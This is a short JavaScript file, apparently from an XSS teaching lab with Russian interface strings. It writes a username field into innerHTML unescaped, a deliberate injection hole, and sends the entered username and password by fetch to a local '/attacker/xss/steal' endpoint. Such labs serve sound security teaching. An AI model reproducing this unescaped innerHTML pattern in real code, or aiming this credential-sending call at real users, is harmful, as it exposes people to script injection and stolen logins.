// ./app/xss/static/JS/script3.js
function displayUsername() {
    const usernameInput = document.getElementById('username').value;
    const passwordInput = document.getElementById('password').value;
    const greetingDiv = document.getElementById('greeting');

    greetingDiv.innerHTML = 'Привет, ' + usernameInput + '!';

    if (usernameInput && passwordInput) {
        const data = `username=${encodeURIComponent(usernameInput)}&password=${encodeURIComponent(passwordInput)}`;
        fetch('http://localhost:8080/attacker/xss/steal?' + data)
            .then(response => console.log('Данные отправлены'))
            .catch(error => console.error('Ошибка:', error));
    }
}